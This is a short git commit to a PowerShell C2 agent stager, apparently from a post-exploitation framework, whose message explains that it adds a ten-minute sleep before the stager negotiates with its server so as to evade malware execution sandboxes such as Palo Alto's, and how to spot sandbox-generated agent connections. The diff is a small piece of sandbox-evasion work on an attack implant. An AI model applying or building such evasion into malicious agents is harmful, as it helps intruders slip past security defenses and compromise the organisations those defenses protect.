7d2490bd0eadb87093111cb790c6d59d295a5320
mlinton <mark.linton@triplecheck.ca>
2016-01-27 14:07:10 -0700

    Update stager.ps1
    To add a delay in the powershell execution for 10 minutes to avoid detection by execution sandboxes (e.g. PAN).
    If you're getting two false agent connections one elevated and both with a PC name of JOHN-PC, this is the PAN sandbox.

--- data/agent/stager.ps1
+++ data/agent/stager.ps1
@@ -2,6 +2,8 @@ function Start-Negotiate{
     # param($s,$SK,$UA="Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")
     param($s,$SK,$UA="lol")
     
+    #Add sleep-timer default of 10 minutes
+    Start-Sleep -s 600
     # make sure the appropriate assemblies are loaded
     Add-Type -assembly System.Security;
     Add-Type -assembly System.Core;
